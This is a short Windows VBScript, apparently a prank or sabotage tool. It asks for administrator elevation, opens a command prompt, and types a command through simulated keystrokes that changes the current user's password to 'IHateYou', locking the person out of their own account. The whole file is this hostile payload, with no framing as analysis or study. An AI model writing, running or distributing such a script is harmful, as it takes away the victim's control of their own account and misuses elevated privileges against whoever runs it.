Option Explicit

Dim UAC
Set UAC = CreateObject("Shell.Application")

If Not WScript.Arguments.Named.Exists("elevated") Then
    UAC.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
    WScript.Quit
End If

Dim Wsh, firstCmd, secondCmd
Set Wsh = CreateObject("WScript.Shell")

firstCmd = "cmd /k"
secondCmd = "net user %username% IHateYou & exit"

Wsh.Run firstCmd, 1, False

WScript.Sleep 175

Dim i, ch

For i = 1 To Len(secondCmd)
    ch = Mid(secondCmd, i, 1)
    Wsh.SendKeys ch
    WScript.Sleep 10
Next

Wsh.SendKeys "{ENTER}"
